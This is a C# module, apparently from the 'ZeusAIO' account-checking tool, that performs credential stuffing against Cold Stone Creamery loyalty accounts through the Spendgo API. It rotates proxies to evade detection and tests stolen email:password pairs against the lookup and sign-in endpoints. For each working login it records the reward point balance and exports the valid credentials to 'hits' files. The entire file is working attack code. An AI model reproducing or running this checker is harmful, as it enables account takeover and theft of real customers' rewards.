using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;                        //willfix
using TunnelBear;


namespace ColdStoneCreamery
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.AllowAutoRedirect = true;
                            string str = "{\"email\":\"" + s[0] + "\"}";
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string strResponse = httpRequest.Post("https://my.spendgo.com/consumer/gen/spendgo/v1/lookup", str, "application/json;charset=UTF-8").ToString();
                            {
                                if (strResponse.Contains("{\"status\":\"NotFound\"}"))
                                {
                                    //bads
                                    break;
                                }
                                else if (strResponse.Contains("{\"status\":\"Activated\"}") || strResponse.Contains("{\"status\":\"Found\"}")) //hit
                                {

                                    string str2 = "{\"value\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\"}";
                                    string strResponse2 = httpRequest.Post("https://my.spendgo.com/consumer/gen/spendgo/v1/signin", str2, "application/json;charset=UTF-8").ToString();
                                    if (strResponse2.Contains("Member id /password incorrect"))
                                    {
                                        //bads 
                                        break;
                                    }
                                    else if (strResponse2.Contains("username\":\""))
                                    {
                                        string ID = Check.Parse(strResponse2, "spendgo_id\":\"", "\",\"");
                                        string postforcap = "{\"spendgo_id\":\"" + ID + "\"}";
                                        string cap = httpRequest.Post("https://my.spendgo.com/consumer/gen/coldstone/v2/rewardsAndOffers", postforcap, "application/json;charset=UTF-8").ToString();
                                        if (cap.Contains("point_total"))
                                        {
                                            try
                                            {
                                                string Points = Regex.Match(cap, "point_total\":(.*?),").Groups[1].Value;
                                                ZeusAIO.mainmenu.hits++;
                                                if (Config.config.LogorCui== "2")
                                                {
                                                    Console.WriteLine("[HIT - COLDSTONE CREMERY] " + s[0] + ":" + s[1] + " | Points: " + Points, Color.Green);
                                                }
                                                Export.AsResult("/Coldstone_hits", s[0] + ":" + s[1] + " | Points: " + Points);
                                                return false;
                                            }
                                            catch
                                            {
                                                ZeusAIO.mainmenu.hits++;
                                                if (Config.config.LogorCui == "2")
                                                {
                                                    Console.WriteLine("[HIT - COLDSTONE CREMERY] " + s[0] + ":" + s[1] + " | Points: Error in Capture, YoBoi is dumb", Color.Green);
                                                }
                                                Export.AsResult("/Coldstone_hits_cap_error", s[0] + ":" + s[1]);
                                                return false;
                                            }
                                        }
                                        else
                                        {
                                            if (Config.config.LogorCui == "2")
                                            {
                                                Console.WriteLine("[FREE - COLDSTONE CREMERY] " + s[0] + ":" + s[1], Color.OrangeRed);
                                            }
                                            Export.AsResult("/Coldstone_frees", s[0] + ":" + s[1]);
                                            return false;
                                        }

                                    }


                                }
                                else
                                {
                                    ZeusAIO.mainmenu.realretries++;
                                    goto Retry;
                                }

                            }
                            //break;
                        }
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }


        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}





